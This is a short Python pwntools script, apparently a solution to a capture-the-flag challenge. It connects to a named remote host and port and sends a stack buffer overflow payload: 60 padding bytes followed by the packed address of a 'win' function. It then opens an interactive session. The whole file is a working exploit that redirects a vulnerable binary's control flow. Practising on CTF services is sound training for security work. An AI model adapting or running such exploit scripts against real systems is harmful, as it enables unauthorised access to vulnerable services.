from pwn import *

host, port = "thekidofarcrania.com", 4902

conn = remote(host, port)

win_addr = 0x08048586

payload = b"A" * 60 + p32(win_addr)

conn.sendline(payload)

conn.interactive()
